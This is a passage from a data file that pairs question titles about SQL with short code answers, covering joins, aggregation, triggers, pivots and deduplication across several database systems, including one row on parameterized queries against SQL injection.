INSERT INTO questions (questionid, answerid, question)
  VALUES (1, 100, 'How long are Abraham Lincoln\'s legs?');
INSERT INTO answers (answerid, questionid, answer)
  VALUES (100, 1, 'Long enough to reach the ground.');
COMMIT;
"
24516,22950,Is there an automatic modification time stamp type for Oracle columns?,"INSERT INTO TABLE (...CREATED_DATE, UPDATED_DATE) VALUES (...,SYSDATE, SYSDATE);

UPDATE TABLE
   SET ...,
       UPDATED_DATE = SYSDATE
"
25102,65109,SQL counting rows having different values,"SELECT V.valore, COUNT(V.valore) AS valori_1
FROM
        values V
JOIN    questionari Q ON (V.questionario_id = Q.id) 
JOIN    sessioni S ON (Q.sessione_id = S.id)
WHERE   V.domanda_id = 1 AND S.anno_accademico = 0 AND S.settimana = 0
GROUP BY V.valore
"
14207,18837,How do I combine these Selects/Joins?,"SELECT tile, description, link, groupName
FROM table_2
JOIN table_1 ON table_2.userId = table_1.id
JOIN table_3 ON table_3.id = table_2.table_3Id
JOIN table_4 ON table_4.id = table_2.table_4Id
"
18483,60389,SELECT - values to columns in query,"select 
 tablea.workplace, 
 tablea.date, 
 tablea.shift, 
 sum(downtimemins),
 tableb.code1,
 tableb.code3, 
 tableb.code4, 
 tableb.code6 
from tablea 
left join downtime on 
 tablea.workplace=tableb.workplace and 
 tablea.date=tableb.date and 
 tablea.shift=tableb.shift 
group by tablea.workplace, tablea.date, tablea.shift
"
37930,60792,How to assign a value to a casted column in Oracle,"select table1.*, (case when table1.id > 10 then 1 else 0 end) as value
from table1
"
19478,74928,SQL many to many relation: create N random records in relations table,"with MyCTE as
(
    SELECT t1.Id as ID1, t2.Id as ID2, ROW_NUMBER() over (partition by t1.CreateBy order by (select newid())) as RowNum
    FROM Table1 t1 
    INNER JOIN Table2 t2 ON t1.CreateBy = t2.CreatedBy
)

insert Table3
select ID1, ID2
from MyCTE
where RowNum <= 10
"
26358,72525,Counting Results in SQL,"COUNT(DISTINCT operation_id) AS raps 
"
5642,75448,Stackoverflow-like comments voting SQL query,"select u.user_id, u.user_name,
       c.comment_id, c.topic_id,
       sum(v.vote) as totals, sum(v.vote > 0) as yes, sum(v.vote < 0) as no,
       my_votes.vote as did_i_vote
from comments c
join users u on u.user_id = c.commenter_id
left join votes v on v.comment_id = c.comment_id
left join votes my_votes on my_votes.comment_id = c.comment_id
                            and my_votes.voter_id = 1
where c.topic_id = 1
group by c.comment_id, u.user_name, c.comment_id, c.topic_id, did_i_vote;
"
7005,63050,SQL query from 2 table into one (is this done by using join?),"INSERT  INTO table3 ( ProductID, Table2ID )
        SELECT  product.Id,
                table2.ID
        FROM    products
                INNER JOIN table2 ON products.ProdDetail LIKE CONCAT('%', table2.name, '%')
"
295,45376,"SQL multiple table query, join syntax","select a.activeID, a.activeName, c.categoryName
from Active a 
left outer join ActiveCategories b on a.activeID = b.activeID
left outer join Categories c on b.categoryID = c.categoryID
"
22732,44920,How can I do a query with subselect,"select p.* from San_Proposta p 
where p.StatusProposta_Id = 1

union 

select p.* from San_Proposta p 
    left join San_Negocio n on n.Proposta_Id = p.Proposta_Id
where p.StatusProposta_Id = 2
    and n.ValidaCaptacao <> n.ValidaVenda
"
24540,62777,SQL Update Left Join - however if no records put 0 in field,"UPDATE P
SET    activityTempBookings = COALESCE(t.bookingTempTotal, 0)
FROM   [LeisureActivities].[dbo].[activities] AS P 
       LEFT JOIN 
       (
           SELECT tempActivityID, 
                  SUM(tempPlaces) bookingTempTotal 
           FROM   [LeisureActivities].[dbo].[tempbookings] 
           WHERE  tempReserveDate > GETDATE () 
           GROUP  BY tempActivityID
       ) t ON t.tempActivityID = p.activityID
"
34973,73455,How to partition table in blocks when value change into one colum in TSQL?,";With Blocks as (
    select d1.one,d1.two,ROW_NUMBER() OVER (ORDER BY d1.one) as BlockNumber
    from @data d1
        left join
        @data d2
            on
                d1.two = d2.two and
                d1.one = d2.one + 1
    where d2.one is null
    union all
    select d.one,d.two,b.BlockNumber
    from
        @data d
            inner join
        Blocks b
            on
                d.two = b.two and
                d.one = b.one + 1
) select * from Blocks
order by one
"
9764,12780,Fetch results count from 2 tables,"select coalesce(rs.retailerid, asr.retailerid) as retailerid,
       coalesce(rs.Clicks, 0) as clicks,
       coalesce(asr.TotalValue, 0) as TotalValue,
       rs.ManufacturerId, asr.ManufacturerId
from (select rs.RetailerId, rs.ManufacturerId, SUM(rs.WidgetClicks) as Clicks
      from RetailerStats rs
      group by RetailerId, ManufacturerId
     ) rs full outer join
     (select asr.retailerid, asr.ManufacturerId, SUM(asr.Earnings) as TotalValue
      from AffiliateSchemeReports asr
      group by RetailerId, ManufacturerId
     ) asr
     on rs.RetailerId = asr.RetailerId and
        rs.ManufacturerId = asr.ManufacturerId
where (rs.ManufacturerId = 104 or asr.ManufacturerId = 104)
"
25195,31030,SQL query select message prints itself,"SELECT 
'title in DB: ' || name as Name
FROM subject;
"
22813,1057,MySQL. Products not sold in a period,"  SELECT * from table1
  WHERE id NOT IN ( select id FROM table1 WHERE
             `date_sold` BETWEEN '2014-05-10' and '2014-05-20')
"
13772,31754,How to find records in one table which aren't in another,"select * from employees
where employee_id not in ( select employee_id from job_history)
/
"
6596,16718,Joining SQL queries with where clause,"SELECT *
FROM klant
JOIN mail ON klant.mail_id = mail.id
"
8881,24422,"SQL group by columns in a table, how to get group with count = 0?","with T1 as
(select distinct SOURCE, ELEMENT, FILE_STATUS, FILE_CREATE_TIME as DAY
 from MED_FILE_TEST_RECORD
)
select t1.*, COUNT(r.FILE_CREATE_TIME)
from T1
left outer join MED_FILE_TEST_RECORD r
-- To do a meaningfull join
on t1.source = r.source
and t1.element = r.element
and t1.filestatus = r.filestatus
and t1.filecreatetime = r.file_create_time
--- And now your original where clause
AND
(r.SOURCE IN ('Japan')) AND 
(r.ELEMENT IN ( 'ELE01', 'ELE02' )) AND 
(r.FILE_STATUS IN ( 'Corrupt', 'Successful' ))  AND
(r.FILE_CREATE_TIME BETWEEN to_date('2014-05-30 00:00:00','YYYY-MM-DD HH24:MI:SS') AND to_date('2014-06-01 23:59:59','YYYY-MM-DD HH24:MI:SS'))
GROUP BY t.SOURCE, t.ELEMENT, t.FILE_STATUS, t.FILE_CREATE_TIME
ORDER BY t.FILE_CREATE_TIME, t.SOURCE, t.ELEMENT, t.FILE_STATUS desc;
"
27688,33137,search Unicode Text in Stored Procedure Using SQL,"CREATE PROCEDURE [dbo].[SearchName]

    @Name NVARCHAR(5) = N''

AS BEGIN

    SELECT * 
    FROM dbo.tblNames 
    WHERE FirstName = @Name

END
"
9440,13703,"SQL query for something like ""not having""?","SELECT Host FROM HostSoftware
WHERE NOT EXISTS (
    SELECT * FROM HostSoftware AS InnerSoftware
    WHERE InnerSoftware.Host = HostSoftware.Host AND InnerSoftware.Software ='Title2'
)
"
8484,72540,Getting rowcount for a column based on values from another column,"DECLARE @Id int, @NoOfRecordsToDisplay int

SET @Id = 123
SET @NoOfRecordsToDisplay = 3

SELECT COUNT(*) FROM myTable
WHERE
  TypeofValue = 2
  AND Id = @Id
  AND [Year] IN ( SELECT TOP(@NoOfRecordsToDisplay) [Year] FROM myTable
              WHERE TypeofValue = 1 AND Id = @Id
              ORDER BY [Year] DESC)
"
39218,9345,how to use an alias name for a calculated expression in SQL," select 
    CASE WHEN calc_field >= 1.5 THEN 1.5
    WHEN calc_field <=0 THEN 0
    ELSE calc_field 
    END result
from (
    select (1-(DayDiff([END_DATE],[START_DATE])*0.01)) calc_field
    from table
    ) K
"
28416,19498,Oracle SQL display a different column depending on the date,"select 
  employee, 
  decode( extract(day from sysdate), 1, day1, 2, day2, 3, day3, ... ) as day
from mytable t
where t.month = extract(month from sysdate)
group by employee
order by employee;
"
7106,51917,SQL LIKE complex request AS400,"SELECT * FROM yourTable 
         WHERE SDVR01  LIKE '%LI[0-9][0-9][0-9][0-9][0-9]%'
"
2674,67592,Complex SQL Query w/ Multiple Tables,"select customer_id
from orders
group by customer_id
having count(distinct product_id) >= 4
"
18210,22643,Best way to create a unique number for each many to many relationship,"
Courses:

Name     NextID
-------  ---------
Math     101
Physics  201

Attendants:

Student Course   Id
------- ------   ----
Smith   Math     99
Jones   Math     100
Smith   Physics  200

BEGIN TRANSACTION;

SELECT NextID
INTO   @NewID
FROM   Courses
WHERE  Name = 'Math'
FOR UPDATE;

INSERT
INTO Attendants (Student, Course, Id)
VALUES ('Doe', 'Math', @NewID);

UPDATE
  Courses
SET NextID = @NewID + 1
WHERE Course = 'Math';

COMMIT;
"
29520,61609,Oracle database table creation,"create table abc.demo (c1 varchar2(10));
"
37614,12779,PostgreSQL query for array in any array,"SELECT * 
FROM identities 
WHERE array['jaylan.jones@runte.name','qwe@qwe.com']::varchar[] && emails;
"
26146,49318,selectively UPDATING old rows when INSERTING new ones into table (trigger issue) in MySQL,"CREATE TRIGGER `update_approval` BEFORE INSERT ON `part_approval`
FOR EACH ROW
UPDATE `table_x` SET `value` = y WHERE `z` = NEW.a;
"
2607,62911,SQL Server (2008) Creating link tables with unique rows,"CREATE UNIQUE INDEX UQ_EventAudience ON dbo.EventAudience(EventID, AudienceID);
"
36162,62900,How to get only one latest record using Stored Procedure,"  select *
  from
   (
     SELECT
     ROW_NUMBER() OVER (PARTITION BY [creatorName] ORDER BY [SendDate] DESC)
     AS [RowNum],     
     *
     FROM [YourTable]
   )base
  WHERE [RowNum] = 1
"
28186,75091,"SQL query to find duplicate rows, in any table",";WITH cte AS (
    SELECT
        *,
        CHECKSUM(*) AS chksum,
        ROW_NUMBER() OVER(ORDER BY GETDATE()) AS row_num
    FROM
        My_Table
)
SELECT
    *
FROM
    CTE T1
INNER JOIN CTE T2 ON
    T2.chksum = T1.chksum AND
    T2.row_num <> T1.row_num
"
31600,41706,Can i change input parameter value on execute sp_executesql?,"declare @var varchar(10) = 'hello'
declare @Query nvarchar(max) = 'print @var set @var = ''bye'' print @var'
EXEC SP_EXECUTESQL @Query, N'@var varchar(10) output', @var output
print @var  -- This prints bye
"
14770,8656,Database to return multi-dimensional result,"SELECT t1.*, GROUP_CONCAT(t2.a_name SEPARATOR ',')
FROM `table1` t1
LEFT JOIN `table_3` t3 ON t3.v_id = t1.v_id
LEFT JOIN `table_2` t2 ON t2.a_id = t3.a_id
WHERE t1.id = 1
GROUP BY [list of t1 columns here] 
-- update thanks to OMG Ponies.
"
305,34454,What is the best SQL statement to query a table using Excel 2010 VBA with ADO (or vb.net with LINQ),"SELECT * 
FROM employees 
WHERE group in 
(SELECT group 
FROM employees 
WHERE name like 'BOB')
"
39779,55946,Complex query over two tables,"SELECT t1.id, SUM(IFNULL(t2.cond, 0) = 1) AS c1, (SELECT SUM(cond = 1) FROM table2 WHERE id2 = 2) AS c2
FROM table1 t1
LEFT JOIN table2 t2 ON t1.id = t2.id2
GROUP BY t1.id
ORDER BY ABS(SUM(IFNULL(t2.cond, 0) = 1) - c2) * RAND();
"
23474,61647,sql question .. how can i dynamically add columns to a sql query result set?,"        SELECT <non-pivoted column>,

            [first pivoted column] AS <column name>,

            [second pivoted column] AS <column name>, ...
    From Table 
    PIVOT (
...
FOR 
...
)
"
17346,39528,MySQL Count matching records from multiple tables,"SELECT  a.id, 
        COALESCE(b.t1, 0) AS t1,
        COALESCE(c.t2, 0) AS t2,
        COALESCE(d.t3, 0) AS t3
FROM
        entity a
    LEFT JOIN
        ( SELECT ei,
                 COUNT(*) AS t1
          FROM table1
          GROUP BY ei
        ) AS b
            ON a.id = b.ei
    LEFT JOIN
        ( SELECT ei,
                 COUNT(*) AS t2
          FROM table2
          GROUP BY ei
        ) AS c
            ON a.id = c.ei
    LEFT JOIN
        ( SELECT ei,
                 COUNT(*) AS t3
          FROM table3
          GROUP BY ei
        ) AS d
            ON a.id = d.ei
  ;
"
25326,71570,SQL Server Trigger On Update or Insert,"create trigger updatereport on log 
after insert, update
as
update r
set status = i.status
from report r 
  inner join inserted i on r.reportid = i.reportid;
"
4149,26013,"Want to use math in SQL column, but it is not an INT","select year(birthdate) as birthyear, joined
from users
where year(birthdate) - joined >= 20
"
6776,65544,MySql how to combine LEFT JOIN query with NOT IN query,"SELECT * FROM 
(
SELECT [WITH YOUR LEFT JOIN STATEMENT]
UNION 
SELECT [WITH YOUR NOT IN STATEMENT]
) ResultTABLE
"
13388,73750,SQL-Time difference,"SELECT COUNT(*)
FROM Table1 t1 INNER JOIN Table2 t2 ON t1.id = t2.id
WHERE 
    (t1.timestamp - t2.timestamp > 1000) or 
    (t2.timestamp - t1.timestamp > 1000)
"
29124,40080,"PLSQL: create XML from ""hierarchical"" table","select DBMS_XMLGEN.getXML(DBMS_XMLGEN.newcontextfromhierarchy('SELECT level,
XMLElement(evalname(TAG_NAME))
from my_table t
START WITH id_parent is null
CONNECT BY PRIOR id = id_parent'))
  FROM dual
"
34742,29295,Create a table from another table,"create table new_table (like old_table);
"
5940,27547,Sql Server select with regular expression,"SELECT SUBSTRING(column1,0,(CHARINDEX('.',column1,CHARINDEX('.',column1)+1))) 
FROM Table1
"
25336,46419,Select multiple rows in single result using SQL Server 2008,"SELECT code
    ,max(CASE 
            WHEN type = 'r'
                THEN value
            ELSE NULL
            END) RValue
    ,max(CASE 
            WHEN type = 'b'
                THEN value
            ELSE NULL
            END) BValue
    ,max(CASE 
            WHEN type = 'd'
                THEN value
            ELSE NULL
            END) DValue
    ,max(CASE 
            WHEN type = 'c'
                THEN value
            ELSE NULL
            END) CValue
FROM mytable
GROUP BY code
"
2307,19968,Stored Procedure - Clear columns except those given,"Declare @columns varchar(max);
Set @columns='';
Select @columns = @columns + column_name +','
From information_schema.columns
Where table_name = @tablename;
"
968,28623,"how to intersect two ""selects"" and then put another condition for the result","SELECT *
  FROM ( SELECT *
           FROM TABLE_A
         INTERSECT
         SELECT *
           FROM TABLE_B
       )
WHERE <conditions>
"
34150,39996,SQL Select Distinct,"SELECT id FROM documents 
GROUP BY id
HAVING COUNT(DocumentNumber) = COUNT(DISTINCT DocumentNumber)
"
29546,65851,concat column value in single value ,"declare @var1 varchar(200)
SELECT @var1 = COALESCE(@var1 + ', ', '') +  Col2 from #table1 where Col1 = 'val1'
Select @var1
"
33963,58174,How do I prevent SQL injection with ColdFusion,"<cfquery name=""rsRecord"" datasource=""DataSource"">
    SELECT * FROM Table
    WHERE id = 
     <cfqueryparam value = ""#url.id#""
        CFSQLType = ""CF_SQL_INTEGER"">
</cfquery>
"
27817,4968,Retrieving data in shuffled order from SQL (Android),"db.rawQuery(""SELECT * FROM mainTable ORDER BY RANDOM()"", null);
"
33934,39774,How to delete duplicate rows in SQL Server with condition?,";WITH ToDelete AS (
  SELECT Id, GroupId, StdId, Active,
         ROW_NUMBER() OVER (PARTITION BY GroupId, StdId
                            ORDER BY Active Desc, Id) AS rn
  FROM mytable 
)
DELETE FROM ToDelete
WHERE (rn > 1) OR (rn =1 AND Active = 0)
"
6784,55785,Rewrite Except Without Distinct,"select t1.ContainerName, t1.PanelName
from MyTable t1
where not exists(
    select * FROM MyOtherTable t2
    where t2.ContainerName=t1.ContainerName
        and t2.PanelName=t1.PanelName
)
"
1017,16216,How do I rank/filter these records in a desired manner,"select ed.*
from (select ed.*,
             row_number() over (partition by emp
                                order by (case when doa <= getdate() then 0 else 1 end),
                                         abs(datediff(day, doa, getdate()))
                               ) as seqnum
      from empdoa ed
     ) ed
where seqnum = 1;
"
13569,19045,SQL Server 2008: DateDiff Returning a negivate value,"CASE WHEN m.cprAdultExp > getDate() THEN dateDiff(day,getDate(),m.cprAdultExp) ELSE NULL END as adultExp
"
16724,4819,how to re-insert all of the existing fields but only change one field data in postgresql?,"insert into table(id,name,age,address) select 2,name,age,address from table
"
9749,67065,How to properly trigger an insert to a linked sql server?,"CREATE TABLE dbo.SyncQueue
(
    QueueId INT IDENTITY(1,1),        
    KeyForSync INT, -- Primary key value of record in dbo.SourceTable
    SyncStatus INT  -- statuses can be: 0 - New, 1 - Synchronized, 2 - Error
)

suppose you source table is

CREATE TABLE dbo.SourceTable
(
        Key INT, -- primary key of the table
        Data varchar(xxx)
)
"
17832,73993,MySQL - Group By Number of Users within Ranges of Unique Login Days and by Department,"select buckets, dept, count(user_name) no_of_u from 
(select 
(case when count(distinct(`time`)) between 1 and 2 then '1-2' 
      when count(distinct(`time`)) between 3 and 4 then '3-4'
      else '5+'
        end) as buckets, dept, user_name
    from change_log where event in ('logged in')  
    group by dept, user_name)
group by buckets, dept
"
6341,30933,MySQL order STRING as INT and inserting,"ORDER BY print_id + 0, print_id
"
32735,29556,SQL loader to load data into specific column of a table,"Example 6-1 Field List Section of Sample Control File
1  (hiredate  SYSDATE,
2     deptno  POSITION(1:2)  INTEGER EXTERNAL(2)
              NULLIF deptno=BLANKS,
3       job   POSITION(7:14)  CHAR  TERMINATED BY WHITESPACE
              NULLIF job=BLANKS  ""UPPER(:job)"",
       mgr    POSITION(28:31) INTEGER EXTERNAL 
              TERMINATED BY WHITESPACE, NULLIF mgr=BLANKS,
       ename  POSITION(34:41) CHAR 
              TERMINATED BY WHITESPACE  ""UPPER(:ename)"",
       empno  POSITION(45) INTEGER EXTERNAL 
              TERMINATED BY WHITESPACE,
       sal    POSITION(51) CHAR  TERMINATED BY WHITESPACE
              ""TO_NUMBER(:sal,'$99,999.99')"",
4      comm   INTEGER EXTERNAL  ENCLOSED BY '(' AND '%'
              "":comm * 100""
    )
"
39244,2560,Read and query SQLite database using sqldf,"require(RSQLite)
con <- dbConnect(SQLite(), dbname=""pisa06.db"")
dbGetQuery(con,""select CNT, SCHOOLID from pisa06"")
"
4803,46863,Sql join back to self by many to many relation,"select distinct t.id, t.name
from
    (
        select distinct entity_id
        from entity_tag
        where tag_id in (1, 2, 3)
    ) e
    inner join
    entity_tag et using (entity_id)
    inner join
    tag t on t.id = et.tag_id
"
14636,62892,SQL fill rows with value from one row in a view,"MAX(<ShopId case clause>) OVER() as ShopId
"
26016,30113,SQL Select Query between 3 tables,"SELECT jm.sku
     , jm.quantity
     , p.description 
FROM  products as p
JOIN  job_sku as jm
    ON p.sku = jm.sku
WHERE EXISTS (
    SELECT 1
    FROM stage s
    WHERE s.Date BETWEEN '2015-04-01' AND '2015-04-30' 
      AND jm.stage = s.stage
);
"
25897,73879,How to use Replicate in MS Access Database?,"SELECT String(5, '0')
"
28897,49959,Sql query limiting number of groups,"SELECT * 
FROM `13_trans_coffee`
WHERE  `Site Code` =103713 AND `Date` 
IN
(
SELECT `Date`
FROM `13_trans_coffee`
WHERE `Site Code` =103713
GROUP BY `Date`
ORDER BY `Date` DESC
LIMIT 0 , 7
) Z;
"
35305,12282,How to copy multiple records in MySql?,"INSERT INTO tb_products
SELECT NULL id, field1, field2, field3, ...
FROM tb_products
WHERE id IN (id1, id2, id3, ...)
"
6002,8046,How to delete record found by a left join,"DELETE ab
FROM `anlagetobedienung` AS ab 
LEFT JOIN anlage_new AS a ON ab.`anlage_id` = a.id 
WHERE a.id IS NULL 
"
22125,39069,Oracle Optimizer Unexpected Results,"CREATE TABLE a (ID NUMBER PRIMARY KEY);
CREATE TABLE b (a_id NUMBER NOT NULL, DATA VARCHAR2(30));
INSERT INTO a (SELECT object_id FROM all_objects);
INSERT INTO b (SELECT object_id, object_name 
                 FROM all_objects WHERE object_type = 'VIEW');

SELECT a.id, b.a_id, b.cnt
  FROM a, (SELECT a_id, COUNT(*) cnt FROM b GROUP BY a_id) b
 WHERE a.id = b.a_id (+)
   AND b.cnt IS NULL;

SELECT a.id, b.a_id, b.cnt
  FROM a, (SELECT a_id, COUNT(*) cnt FROM b GROUP BY a_id) b
 WHERE a.id = b.a_id (+)
   AND b.a_id IS NULL;
"
169,31803,"Select from the result of a union query, Oracle","SELECT tbl.name
FROM
(
    SELECT name FROM customer
    UNION
    SELECT name FROM vendor
) tbl
"
28956,30404,how to find data under other data in sql with cursor,"set serveroutput on;
declare
 cboss_name varchar2(30) ;
 csalary number ;  
 CURSOR cur
 is       
  select boss_name,sum(salary)  as salary
  from police 
  where boss_name is not null 
  group by boss_name;
begin
   open cur;
   fetch cur into cboss_name,csalary;
    dbms_output.put_line('boss_name'||' '||'csalary');
    LOOP
    FETCH cur INTO cboss_name,csalary;
       EXIT WHEN cur%NOTFOUND;
       dbms_output.put_line(cboss_name||'         '||csalary);
   END LOOP;

   close cur;  
end;
"
36847,46010,"Is there a ""Code Coverage"" equivalent for SQL databases?","SELECT * FROM(SELECT COALESCE(OBJECT_NAME(s2.objectid),'Ad-Hoc') AS ProcName,execution_count,
    (SELECT TOP 1 SUBSTRING(s2.TEXT,statement_start_offset / 2+1 ,
      ( (CASE WHEN statement_end_offset = -1
         THEN (LEN(CONVERT(NVARCHAR(MAX),s2.TEXT)) * 2)
         ELSE statement_end_offset END)  - statement_start_offset) / 2+1))  AS sql_statement,
       last_execution_time
FROM sys.dm_exec_query_stats AS s1
CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS s2 ) x
WHERE sql_statement like '%spt_values%'  -- replace here
AND sql_statement NOT like 'SELECT * FROM(SELECT coalesce(object_name(s2.objectid)%'
ORDER BY execution_count DESC
"
39498,71292,Query results with no reverse,"SELECT mt1.UserA, mt1.UserB, mt1.numberOfConnections
FROM MyTable mt1
LEFT OUTER JOIN MyTable mt2 ON mt1.UserA = mt2.UserB
        AND mt1.UserB = mt2.UserA
WHERE mt2.UserA IS NULL
    OR mt1.UserA < mt2.UserA
"
17226,48201,How to update table in sqlite android," String where = fname+ ""="" + ""ekanta"" + "" and "" + lname + ""="" + ""your lastname"";
"
21570,46217,How to compare smalldatetime in stored procedure,"select @ID=ID 
  from info_user
 where Name = @Name
   and cast (UpdateTime as Date) = Cast(@TestTime as Date)
"
33136,33920,Linq Performance with predicates,"GetSubtitleProcessCount(Expression<Func<WF_Process, bool>> predicate)
"
36059,33730,SQL Query is taking long time,"SELECT DISTINCT TC.V_ID, A.ID, A.NAME 
FROM OM_A_DATA TC INNER JOIN
     ACC_DOM_EXT AE
     ON TC.DOMAINS = AE.DOMAIN LEFT OUTER JOIN
     ACCOUNT A
     ON A.ID = AE.ACCOUNTID
WHERE NOT EXISTS (SELECT 1 FROM DATA_ACC_MAP dam WHERE dam.V_ID = tc.V_ID );
"
37901,63917,Retrieve only the first row with ORDER BY,"SELECT * FROM
  (SELECT epi.inc_amt FROM emp_pay_inc epi ORDER BY epi.inc_date DESC)
WHERE ROWNUM = 1;
"
36156,56819,AVG of Values except 0 (except 0 is only value) in SQL,"SELECT IFNULL(AVG(feature), 0)
FROM cluster_density_feat 
WHERE cluster_id = 1
   AND feature <> 0
"
15169,50023,SQL Server: how to use if else statement to select different data from same table,"ALTER PROCEDURE [dbo].[FetchRequests]
    @selection nvarchar(20)
AS
BEGIN
    SET NOCOUNT ON;
    SELECT      col1,
                col2,
                col3,
                col4,
                col5,
                statusX,
                logStatus,
                logID
    FROM        LogRequests
    WHERE       logStatus = 'active'
    AND ((statusX <> 'Published' AND @selection = 'active')
    OR (statusX = 'Published' AND @selection <> 'active'))
    ORDER BY    logID desc
    FOR XML PATH('cols'), ELEMENTS, TYPE, ROOT('ranks')

END
"
36573,13622,SQL Group By question - choosing which row gets grouped,"select p.id, c.id as priorid, p.numusers-c.numusers AS dif, p.date, c.date as priordate    
from licenses p
join licenses c on c.serial=p.serial
  and c.date=(select max(date) from licenses ref where ref.serial=p.serial
    and ref.date<p.date)
order by p.serial
"
15101,957,Update multiple columns that start with a specific string,"CREATE OR REPLACE FUNCTION reset_cols() RETURNS boolean AS $$ BEGIN 
    EXECUTE (select 'UPDATE table SET ' 
                  || array_to_string(array(
                              select column_name::text 
                              from information_schema.columns 
                              where table_name = 'table' 
                              and column_name::text like 'contact_info_address_%'
                     ),' = NULL,') 
                  || ' = NULL'); 
    RETURN true; 
 END; $$ LANGUAGE plpgsql;

-- run the function
SELECT reset_cols();
"
35957,74068,SQL CASE SUM gives me 0,"SELECT
    c.category_id,
    CASE c.parent_id WHEN 0 THEN d.name END as category_main
from category c
    LEFT JOIN category_description d
        ON d.category_id = c.category_id
"
7794,63804,populating missing dates and max date,"SELECT
   t1.date_
 , t1.product
  , case 
    when t1.due_date is not null then t1.due_date
    else ( 
          select max(due_date) 
          from sot t2 
          where t2.product = t1.product 
            and t2.due_date <= t1.date_
            and t2.date_ > t1.date_
          )
    end                                   
                  as due_date
, t3.max_date
FROM 
    sot t1
    left outer join (  select product, max(date_) keep (dense_rank first order by due_date desc)  as max_date 
                       from sot  
                      where due_date is not null 
                      group by product
                    ) t3
    on (t3.product = t1.product)
order by product, date_;
"
26671,60031,Preserve left table in group by,"select y.[Day],count(Id) 
from @Daye y 
left join @Data d on y.[Day] = d.[Day] and d.Status=1
group by y.[Day]
"
16419,22028,How do I write a query that works in both HSQLDB and MySQL to add days to a date in the WHERE clause?,"TypedQuery<SomeClass> q = getEntityManager().crateQuery(
    ""select s from SomeClass s where s.date = :date"", SomeClass.class);
Calendar now = Calendar.getInstance();
// subtract number of days from current date, e.g. 10 days
now.add(Calendar.DAY, -10);
q.setParameter(""date"", now);
List<SomeClass> = q.getResultList();
"
35092,1741,help creating a complicated stored procedure,"SELECT     'QUERY1' AS QUERYNAME, dbo.BOOKINGS.USERID, SUM(dbo.BOOKINGS.APRICE) AS total, COUNT(dbo.BOOKINGS.USERID) AS TOTAL2
FROM         dbo.BOOKINGS INNER JOIN
             dbo.TOURS ON dbo.BOOKINGS.TOUR = dbo.TOURS.TOUR INNER JOIN
             dbo.MAJOR ON dbo.TOURS.MAJOR = dbo.MAJOR.MAJOR
WHERE     (dbo.BOOKINGS.BOOKED BETWEEN CONVERT(int, @startdate) AND CONVERT(int, 
@enddate)) AND (dbo.MAJOR.SDESCR = 'Cruises') AND 
                      (dbo.BOOKINGS.USERID = @USER) AND (dbo.MAJOR.DIVISION = 'A')
GROUP BY dbo.BOOKINGS.USERID

UNION ALL

SELECT     'QUERY2' AS QUERYNAME, dbo.BOOKINGS.USERID, SUM(dbo.BOOKINGS.APRICE) AS total, COUNT(dbo.BOOKINGS.USERID) AS TOTAL2
FROM         dbo.BOOKINGS INNER JOIN
                      dbo.TOURS ON dbo.BOOKINGS.TOUR = dbo.TOURS.TOUR INNER JOIN
                      dbo.MAJOR ON dbo.TOURS.MAJOR = dbo.MAJOR.MAJOR
WHERE     (dbo.BOOKINGS.BOOKED BETWEEN CONVERT(int, @startdate) AND CONVERT(int, 
    @enddate)) AND (dbo.MAJOR.SDESCR <> 'Cruises') AND 
                      (dbo.BOOKINGS.USERID = @USER) AND (dbo.MAJOR.DIVISION = 'A')
GROUP BY dbo.BOOKINGS.USERID

UNION ALL

SELECT         'QUERY3' AS QUERYNAME, dbo.HOMES.USERID, SUM(dbo.SUBS.AMOUNT) AS total, COUNT(dbo.SUBS.AMOUNT) AS TOTAL2
FROM         dbo.HOMES INNER JOIN
                      dbo.SUBS ON dbo.HOMES.HOME = dbo.SUBS.HOME AND dbo.HOMES.JOINED 
    = dbo.SUBS.PAIDON
WHERE     (dbo.HOMES.JOINED BETWEEN CONVERT(int, @startdate) AND CONVERT(int, 
    @enddate)) AND (dbo.HOMES.USERID = 
    @USER)
GROUP BY dbo.HOMES.USERID
"
29194,51418,Pl/sql script to compute the free space in the users tablespace in oracle,"CREATE OR REPLACE PROCEDURE snap_free_space
AS
BEGIN
  INSERT INTO new_table( tablespace_name, free_bytes, collection_time )
    SELECT tablespace_name, sum(bytes), sysdate
      FROM dba_free_space
     GROUP BY tablespace_name;
END;
"
2443,70,SQL - Turn relationship IDs into a delimited list,"SELECT a, b, c,  SiteIds = 
    STUFF((SELECT ', ' + SiteId
           FROM your_table t2 
           WHERE t2.a = t1.a AND t2.b = t1.b AND t2.c = t1.c
          FOR XML PATH('')), 1, 2, '')
FROM your_table t1
GROUP BY a, b, c
"
24787,68761,Calling stored procedure to insert multiple values,"MERGE [dbo].[Contact] AS [Target] 
USING @Contact AS [Source] ON [Target].[Email] = [Source].[Email]
WHEN MATCHED THEN 
   UPDATE SET [FirstName] = [Source].[FirstName],
              [LastName] = [Source].[LastName]
WHEN NOT MATCHED THEN
    INSERT ( [Email], [FirstName], [LastName] )
    VALUES ( [Source].[Email], [Source].[FirstName], [Source].[LastName] );
"
26469,41590,Create View with Year Days,"SELECT add_months(TRUNC(sysdate - (365), 'YYYY'),to_number(to_char(sysdate,'mm'))) + (level - 1) AS the_day
  FROM dual
CONNECT BY level <=
           to_number(TO_CHAR(last_day(add_months(TRUNC(sysdate, 'YYYY'), 11)),
                             'DDD'))
"
16808,50819,SELECT clause with MINUS INTERSECT and UNION,"SELECT DNAME 
FROM
(
  SELECT 'SALES' DNAME, COUNT(*) MISSING_CITIES
  FROM
  (
    SELECT DISTINCT CITY FROM DEPTLOC
      MINUS
    SELECT CITY FROM DEPTLOC WHERE DNAME = 'SALES'
  )
  UNION ALL
  SELECT 'RESEARCH', COUNT(*) FROM
  (
    SELECT DISTINCT CITY FROM DEPTLOC
      MINUS
    SELECT CITY FROM DEPTLOC WHERE DNAME = 'RESEARCH'
  )
)
WHERE MISSING_CITIES = 0;
"
35831,3064,Average grade of student temporary table in SQL Server,"SELECT s.SDedc, c.CDesc, r.CRGrade, AVG(r.CRGrade) OVER (PARTITION BY s.SNo) AS average_grade 
    FROM Students_T             AS s 
    LEFT JOIN CoursesRegister_T AS r ON r.CR_SNo = s.SNo 
    LEFT JOIN Courses_T         AS c ON r.CR_CNo = c.CNo;
"
20160,44161,Turn a list of single-column SQL SELECT results into a single line,"Select a.column1,b.column2,c.column3 from
(SELECT column1 FROM db WHERE country ='USA' and commodity='pork') as a,
(SELECT column1 FROM db WHERE country ='BRA' and commodity='pork') as b,
(SELECT column1 FROM db WHERE country ='CHN' and commodity='pork') as c
"
4506,51004,SQL Query group shuffle,"select id, item, producer from table order by rand();
"
